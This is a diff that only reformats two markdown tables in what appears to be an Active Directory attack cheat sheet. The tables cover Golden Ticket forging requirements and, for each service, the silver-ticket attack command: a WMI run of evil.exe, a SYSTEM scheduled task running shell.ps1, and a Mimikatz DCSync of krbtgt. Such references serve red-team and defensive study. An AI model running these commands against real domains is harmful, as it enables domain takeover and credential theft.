@@ -45,12 +45,12 @@ A Golden Ticket is a forged Kerberos Ticket Granting Ticket (TGT) that allows an
 
 **Requirements**:
 
-| Requirement       | Description |
-| ----------------- | ----------- |
-| Domain name       | corp.local  |
-| Domain SID        | S-1-5-21-1234567890-2345678901-3456789012 |
-| KRBTGT NTLM hash  | The NTLM hash of the KRBTGT account |
-| Username          | Administrator |
+| Requirement       | Description                                             |
+| ----------------- | ------------------------------------------------------- |
+| Domain name       | corp.local                                              |
+| Domain SID        | S-1-5-21-1234567890-2345678901-3456789012               |
+| KRBTGT NTLM hash  | The NTLM hash of the KRBTGT account                     |
+| Username          | Administrator                                           |
 | (Optional) Groups | Add group SIDs for elevated access (e.g., Domain Admin) |
 
 As a result of `CVE-2021-42287` mitigations, the ticket cannot use a non-existent account name.
@@ -133,15 +133,15 @@ root@kali:/tmp$ ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.
 
 Interesting services to target with a silver ticket :
 
-| Service Type                                | Service Silver Tickets | Attack |
-|---------------------------------------------|------------------------|--------|
-| WMI                                         | HOST + RPCSS           | `wmic.exe /authority:"kerberos:DOMAIN\DC01" /node:"DC01" process call create "cmd /c evil.exe"`     |
-| PowerShell Remoting                         | CIFS + HTTP + (wsman?) | `New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC` |
-| WinRM                                       | HTTP + wsman           | `New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC` |
-| Scheduled Tasks                             | HOST                   | `schtasks /create /s dc01 /SC WEEKLY /RU "NT Authority\System" /IN "SCOM Agent Health Check" /IR "C:/shell.ps1"` |
-| Windows File Share (CIFS)                   | CIFS                   | `dir \\dc01\c$` |
-| LDAP operations including Mimikatz DCSync   | LDAP                   | `lsadump::dcsync /dc:dc01 /domain:domain.local /user:krbtgt` |
-| Windows Remote Server Administration Tools  | RPCSS   + LDAP  + CIFS | /      |
+| Service Type                               | Service Silver Tickets | Attack                                                                                                           |
+| ------------------------------------------ | ---------------------- | ---------------------------------------------------------------------------------------------------------------- |
+| WMI                                        | HOST + RPCSS           | `wmic.exe /authority:"kerberos:DOMAIN\DC01" /node:"DC01" process call create "cmd /c evil.exe"`                  |
+| PowerShell Remoting                        | CIFS + HTTP + (wsman?) | `New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC`                                          |
+| WinRM                                      | HTTP + wsman           | `New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC`                                          |
+| Scheduled Tasks                            | HOST                   | `schtasks /create /s dc01 /SC WEEKLY /RU "NT Authority\System" /IN "SCOM Agent Health Check" /IR "C:/shell.ps1"` |
+| Windows File Share (CIFS)                  | CIFS                   | `dir \\dc01\c$`                                                                                                  |
+| LDAP operations including Mimikatz DCSync  | LDAP                   | `lsadump::dcsync /dc:dc01 /domain:domain.local /user:krbtgt`                                                     |
+| Windows Remote Server Administration Tools | RPCSS   + LDAP  + CIFS | /                                                                                                                |
 
 Mitigations:
 
